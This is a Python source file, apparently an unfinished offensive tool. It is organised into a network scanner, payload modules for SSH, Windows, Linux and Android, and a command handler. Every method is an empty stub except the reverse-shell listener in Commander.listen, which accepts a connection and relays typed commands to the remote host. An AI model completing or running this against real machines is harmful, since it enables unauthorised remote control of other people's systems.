import scapy.all as scapy
import socket
import time
import sys

def banner():
    pass

class Scanner:

    def __init__(self, target_data):
        self.target_data = target_data

    def get_device(self):
        pass

    def get_network_devices(self):
        pass

class Modules:

    def __init__(self, listener_ip, listener_port):
        self.listener_ip = listener_ip
        self.listener_port = listener_port

    def start_listener(self):
        pass

    def send_generic_payload(self):
        pass

    def send_ssh_payload(self):
        pass

    def send_windows_payload(self):
        pass

    def send_linux_payload(self):
        pass

    def send_android_payload(self):
        pass

class Commander:

    def __init__(self, command_instructionn):
        self.command_instructionn = command_instructionn

    def listen(self, receiver_ip, receiver_port):

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((receiver_ip, receiver_port))
        s.listen(1)
        print("Listening on port " + str(receiver_port))
        conn, receiver_ip = s.accept()
        print('Connection received from ',receiver_ip)
        while True:

            ans = conn.recv(1024).decode()
            sys.stdout.write(ans)
            command = input()

            command += "\n"
            conn.send(command.encode())
            time.sleep(1)

            sys.stdout.write("\033[A" + ans.split("\n")[-1])

def main():

    pass

if __name__ == '__main__':

    main()